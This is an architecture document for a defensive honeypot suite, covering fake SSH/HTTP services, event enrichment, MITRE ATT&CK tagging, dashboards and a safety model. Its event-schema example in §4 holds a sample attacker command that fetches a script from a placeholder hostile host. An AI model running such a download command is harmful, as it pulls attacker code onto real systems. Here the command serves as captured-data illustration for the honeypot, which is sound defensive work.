# HoneyBadger — System Architecture

## 1. Overview

HoneyBadger is a self-contained threat-intelligence honeypot suite. It exposes a fake SSH server and a fake HTTP surface, then captures, enriches, and visualizes everything an attacker does — from credential stuffing to payload downloads — without ever executing a single byte on the host.

Design goals (in priority order):

1. **Containment** — nothing an attacker does ever leaves the sandbox.
2. **Originality** — the SSH emulation, event bus, enrichment pipeline, and dashboard are all built in-house (no Cowrie).
3. **Demoability** — one `docker-compose up` spins up the whole stack, seeded by an attack simulator.
4. **Security literacy** — every event auto-classified against MITRE ATT&CK.

## 2. System diagram

```
                          ┌─────────────────────────────────────────────┐
                          │                docker-compose               │
                          │                                             │
  Attacker                │   ┌───────────────────────────────────┐     │
 ─────────► port 8022 ──► │   │  backend  (Python, one asyncio    │     │
 ─────────► port 8081 ──► │   │  loop, one container)             │     │
                          │   │                                   │     │
                          │   │  sshd.py (asyncssh)               │     │
                          │   │      │ dispatch commands          │     │
                          │   │      ▼                           │     │
                          │   │  fakeshell.py  ──► payloads.py    │     │
                          │   │                                   │     │
                          │   │  httpd.py (aiohttp)               │     │
                          │   │      │ select bait                │     │
                          │   │      ▼                           │     │
                          │   │  http_routes.py                   │     │
                          │   │       \                           │     │
                          │   │        ▼                          │     │
                          │   │   ┌─────────────┐                 │     │
                          │   │   │  raw bus    │                 │     │
                          │   │   │  (bus.py)   │                 │     │
                          │   │   └──────┬──────┘                 │     │
                          │   │          ▼                        │     │
                          │   │   pipeline.py                       │     │
                          │   │      ├── geoip.py   (enrich)       │     │
                          │   │      ├── mitre.py   (ATT&CK tag)   │     │
                          │   │      ├── credentials.py (hash+count)│     │
                          │   │      └──► storage.py ──► PostgreSQL │     │
                          │   │          │                          │     │
                          │   │             ▼                       │     │
                          │   │   enriched bus (bus.py) ──► api.py   │     │
                          │   │                      REST :8090     │     │
                          │   │                      WebSocket      │     │
                          │   └──────────┬────────────────────────┘     │
                          │              │ (WS/REST)                    │
                          │              ▼                              │
                          │   dashboard/  (React + Vite SPA)            │
                          │              │                              │
                          │   metrics.py ◄─► Prometheus ──► Grafana     │
                          │                     │                       │
                          │                     ▼                       │
                          │                 Alertmanager                │
                          └─────────────────────────────────────────────┘
```

## 3. Components

### 3.1 `backend/` — Python honeypot core

One container, one asyncio event loop, zero external brokers. All modules above compose at runtime:

| Module | Responsibility |
|---|---|
| `main.py` | Wiring: builds the buses, starts the listeners, starts the pipeline, creates the DB pool |
| `bus.py` | In-process asyncio pub/sub. Two instances: **raw bus** (sensor → pipeline) and **enriched bus** (pipeline → API) |
| `sshd.py` | `asyncssh` server. Accepts any credentials, drops the peer into `fakeshell.py` |
| `fakeshell.py` | Emulated shell: `ls`, `cd`, `pwd`, `cat`, `whoami`, `id`, `uname`, `echo`, `history`… plus `wget`/`curl` interception |
| `httpd.py` | `aiohttp` HTTP honeypot — the internet-facing edge. Own rate-limits and buffering |
| `http_routes.py` | Bait responses: fake login pages, common probe responses (wp-login, admin, `.env`, API keys…) |
| `pipeline.py` | Subscribers that transform raw events into enriched facts |
| `geoip.py` | `GeoIpProvider` interface. Default `ip-api.com` (no key, cached); MaxMind/GeoLite2 opt-in |
| `mitre.py` | Rule-based ATT&CK classifier (see §5) |
| `credentials.py` | Extracts credentials, stores **hashes only**, maintains top-N counters for the dashboard |
| `status.py/payloads.py` | Payload capture — metadata only, never fetch/execute (see §6) |
| `api.py` | REST endpoints for stats/aggregates + WebSocket broadcast of live events |
| `storage.py` | Async SQLAlchemy → PostgreSQL; repositories per entity |
| `metrics.py` | `prometheus_client` export on `:8000` |
| `alerts.py` | **Deferred.** Prometheus evaluates alert rules; the backend exports metrics only and never pushes to Alertmanager |
| `retention.py` | Scheduled purge of events older than 6 months |

### 3.2 `dashboard/` — React + Vite SPA

- A **single-page threat-ops console**: live feed over WebSocket, KPI cards,
  activity chart, technique mix, world map, top credentials/sources, payloads.
- **Statistics** via REST polling (counts, top credentials, top source IPs, technique breakdown).
- Served by nginx on `:3000`; nginx proxies `/api` and `/ws` to `backend:8090`
  so the browser uses one origin and no CORS. `VITE_API_MODE=mock` renders the
  console without a backend.

### 3.3 `monitoring/` — Observability

- **Prometheus** scrapes `backend:8000` and evaluates recording + alert rules.
  It is the **single alerting authority**; thresholds live in
  `monitoring/prometheus/rules/alerts.yml`.
- **Alertmanager** routes alerts from Prometheus (webhook/email optional).
  The backend does not push alerts to it.
- **Grafana** (`:3001`) with **three** provisioned ops dashboards: **Overview**,
  **Attack Patterns**, **Pipeline Health**. The geographic attack view is a
  React-dashboard feature, not a Grafana one.
- `fixtures` is a dev-only compose profile serving synthetic metrics on
  `127.0.0.1:9101` so Grafana can be previewed before the backend exporter
  exists; it must never be enabled in production.

### 3.4 PostgreSQL

- `events` — one row per captured interaction (`inet` source IP, service, username, `pass_hash`, UA, HTTP fields, command, payload refs, `technique_id`, severity).
- `credential_counts` — aggregate counters (top-N), no plaintext.
- `payloads` — URL, hash, size, quarantine status.
- GeoIP cache table.
- Indexes: `(source_ip, ts)`, `(service, ts)`.

## 4. Event model (intake contract)

```jsonc
{
  "service": "ssh | http",
  "source_ip": "203.0.113.7",
  "timestamp": "2026-09-24T10:15:30Z",       // NOT "ts"
  "login_info": {
    "username": "root",
    "password_hash": "sha256:<hex>"           // computed at the edge
  },
  "user_agent": "curl/8.0",
  "http_method": "POST", "http_path": "/wp-login.php", "http_status_code": 200,
  "command": "wget http://evil.example/x.sh",
  "payload_url": "http://evil.example/x.sh",
  "payload_hash": "...", "payload_size": 1234
}
```

Password values are never accepted or returned — only `sha256:<64 hex>` hashes.
Full REST/WS contract: `docs/API.md`.

## 5. MITRE ATT&CK classification

| Event pattern | Technique |
|---|---|
| Password guessing (SSH/HTTP login attempts) | T1110 — Brute Force |
| Repeated same-credential attempts | T1110.004 — Credential Stuffing |
| Scanner / probe hits | T1595 — Active Scanning |
| Exploit-shaped payloads | T1190 — Exploit Public-Facing Application |
| Payload download attempt (`wget`/`curl`) | T1105 — Ingress Tool Transfer |
| Shell commands issued | T1059 — Command and Scripting Interpreter |
| "Successful" session context | T1078 — Valid Accounts (contextual) |

The attack simulator in `sim/simulate.py` asserts that synthetic attacks produce the correct technique tags — the classifier is verified by tests, not by hand.

## 6. Safety model

- **No plaintext credentials anywhere.** Passwords are hashed at the edge; only aggregates (+OSINT-grade metadata) are persisted.
- **Payloads are never fetched or executed.** `wget`/`curl` return fake success; only the URL + hash + size are recorded. `CAPTURE_PAYLOADS=true` (opt-in, off by default) stages files into a **noexec quarantine** for manual static review.
- **Network egress is explicit.** The compose network is a plain bridge (not
  `internal: true`) because the default `ip-api` GeoIP provider needs egress;
  the honeypot never connects to attacker-supplied addresses. Containment —
  allow-lists, offline MaxMind/GeoLite2, or `NullProvider` — is a backend-slice
  decision, documented as a deliberate exception rather than silently granting
  internet access.
- **Alerts are meaningful**: rate-based (brute-force wave), payload capture,
  retention lag and service health are evaluated by Prometheus. There is
  deliberately **no "login success" alert** — the honeypot always accepts
  credentials, so it would fire on every event. The backend does not push
  alerts; `backend/alerts.py` is deferred.

## 7. Ports

| Service | Container | Host |
|---|---|---|
| SSH honeypot (`sshd.py`) | 8022 | 8022 |
| HTTP honeypot (`httpd.py`) | 8081 | 8081 |
| Metrics (`metrics.py`) | 8000 | 8000 |
| Intake API (`api.py`) | 8090 | 8090 |
| Dashboard (React SPA) | 80 | 3000 |
| PostgreSQL | 5432 | `127.0.0.1:5432` (loopback only) |
| Prometheus | 9090 | 9090 |
| Alertmanager | 9093 | 9093 |
| Grafana | 3000 | 3001 | (container→host)
| Fixtures exporter (dev profile) | 9101 | `127.0.0.1:9101` |

The SSH honeypot container listens on **8022** (`HB_SSH_PORT`), not 22, so host
and container mappings match and there is no privileged port. Grafana is on
host **3001** so the React console keeps `3000`.

## 8. Deployment

Single-machine deployment via docker-compose (no Kubernetes in v1):

```bash
docker compose up -d
```

The compose file is complete and `docker compose config` is valid. Monitoring
services can start independently, and dashboard nginx keeps serving the SPA if
the backend is absent. **The backend image is gated on backend slice 6**:
`backend/Dockerfile` is empty until then, so `backend` is the only service that
cannot build yet. PostgreSQL is healthchecked; the backend waits for it, while
the dashboard depends on `service_started` (there is no backend healthcheck yet,
and one would block forever on an unimplemented image).

To preview Grafana before the backend exporter exists:

```bash
docker compose --profile fixtures up -d   # synthetic metrics on 127.0.0.1:9101
```

The fixtures profile is dev-only and must never be enabled in production.

## 9. Testing strategy

- **Unit**: fakeshell command parsing, MITRE classifier, pipeline enrichment, GeoIP provider caching, credential hashing.
- **Integration**: `test_end_to_end.sh`, `test_api_contract.py` (intake contract).
- **Security**: `test_network_isolation.sh` (containment), `test_credentials.sh` (hash-only policy).
- **Simulator**: `sim/simulate.py` — generates realistic attack traffic, used both for demos and as the integration driver.